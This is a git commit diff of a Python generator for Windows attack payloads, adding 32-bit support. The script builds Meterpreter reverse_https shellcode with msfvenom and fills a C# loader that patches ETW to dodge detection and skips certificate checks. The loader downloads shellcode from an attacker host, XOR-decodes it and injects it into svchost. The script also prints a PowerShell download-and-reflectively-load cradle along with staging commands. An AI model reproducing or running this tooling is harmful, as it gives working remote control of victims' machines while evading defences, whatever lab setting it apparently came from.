c7a136dd142149268ee250314b4870e0a364a47b
Andrew Klaus <andrew@aklaus.ca>
2022-03-12 08:51:36 -0700

    generate_win_ps_dll_runner: Support for 64bit and 32bit shellcode

--- generate_win_ps_dll_runner.py
+++ generate_win_ps_dll_runner.py
@@ -10,9 +10,12 @@ BASE_FILENAME = 'win_ps_dll_runner'
 #ENCODER="x64/zutto_dekiru"
 ENCODER="generic/none"
 MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e {ENCODER}"
-MSFVENOM_CMD = f"msfvenom --platform Windows -p windows/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e {ENCODER}"
+MSFVENOM32_CMD = f"msfvenom --platform Windows -p windows/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e {ENCODER}"
 SVCHOST_PATH = b"C:\\\\Windows\\system32\\svchost.exe"
 XOR_KEY = b'\x00'
+WEBROOT = "/var/www/html"
+SHELLCODE_PATH = "/sc"
+SHELLCODE32_PATH = "/sc32"
 
 def generate(shellcode):
   svchost_path = Obfuscator(SVCHOST_PATH)
@@ -100,8 +103,8 @@ namespace LeMans
         [DllImport("kernel32")]
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); 
 
-[DllImport("ntdll.dll", SetLastError=true)]
-static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);
+        [DllImport("ntdll.dll", SetLastError=true)]
+        static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);
 
         private static byte[] getETWPayload()
         {{
@@ -148,10 +151,10 @@ static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecu
 
             PatchEtw(getETWPayload());
 
-            string url = "http://192.168.49.65/sc";
+            string url = "http://{LHOST}/{SHELLCODE_PATH}";
 
             if (!is64Bit())
-                url = "http://192.168.49.65/sc32";
+                url = "http://{LHOST}/{SHELLCODE32_PATH}";
 
 
             ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
@@ -160,10 +163,10 @@ static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecu
 
             // byte[] buf = new byte[] {{ {xor_shellcode} }};
 
-            //for (int i = 0; i < buf.Length; i++)
-            //{{
-            //    buf[i] = (byte)(((uint)buf[i] ^ {xor_key}) & 0xFF);
-            //}}
+            for (int i = 0; i < buf.Length; i++)
+            {{
+                buf[i] = (byte)(((uint)buf[i] ^ {xor_key}) & 0xFF);
+            }}
 
          // The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll can be used as alternatives to VirtualAllocEx and WriteProcessMemory.
 
@@ -224,28 +227,12 @@ static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecu
         }}
     }}
 }}
-""".format(xor_shellcode=shellcode.get_hex_csharp(),xor_svchost_path=svchost_path.get_hex_csharp(), xor_key=shellcode.get_key_csharp())
+""".format(xor_shellcode=shellcode.get_hex_csharp(),xor_svchost_path=svchost_path.get_hex_csharp(), xor_key=shellcode.get_key_csharp(),SHELLCODE_PATH=SHELLCODE_PATH,SHELLCODE32_PATH=SHELLCODE32_PATH)
 
   print(template)
   f = open(BASE_FILENAME + '.cs', "w")
   f.write(template)
   f.close()
-
-  ps = """
-$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/{fn}')
-$assem = [System.Reflection.Assembly]::Load($data)
-
-$class = $assem.GetType('LeMans.Class1')
-$method = $class.GetMethod("ferrari")
-$method.Invoke(0, $null)
-""".format(fn=BASE_FILENAME + '.dll')
-  print(ps)
-
-  f = open(BASE_FILENAME + '.sc', "wb")
-  f.write(shellcode.get_bytes())
-  f.close()
-
-  print("Wrote " + BASE_FILENAME + '.sc')
 
 
 def compile():
@@ -254,9 +241,37 @@ def compile():
 
 def main():
   shellcode = ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
+  shellcode32 = ShellCode(MSFVENOM32_CMD, xor_key=XOR_KEY)
   generate(shellcode)
   compile() 
 
+  # Write 64bit shellcode
+  f = open(BASE_FILENAME + '.sc', "wb")
+  f.write(shellcode.get_bytes())
+  f.close()
+  print("Wrote " + BASE_FILENAME + '.sc')
+
+  # Write 32bit shellcode
+  f = open(BASE_FILENAME + '.sc32', "wb")
+  f.write(shellcode32.get_bytes())
+  f.close()
+  print("Wrote " + BASE_FILENAME + '.sc32')
+
+  print("Load with:")
+  ps = """
+$data = (New-Object System.Net.WebClient).DownloadData('http://{LHOST}/{fn}')
+$assem = [System.Reflection.Assembly]::Load($data)
+
+$class = $assem.GetType('LeMans.Class1')
+$method = $class.GetMethod("ferrari")
+$method.Invoke(0, $null)
+""".format(fn=BASE_FILENAME + '.dll', LHOST=LHOST)
+  print(ps)
+
+  print("Run the following:")
+  print("cp " + BASE_FILENAME + '.dll ' + WEBROOT + "/" + BASE_FILENAME + '.dll')
+  print("cp " + BASE_FILENAME + ".sc " + WEBROOT + SHELLCODE_PATH)
+  print("cp " + BASE_FILENAME + ".sc32 " + WEBROOT + SHELLCODE32_PATH)
 
 if __name__ == "__main__":
   main()
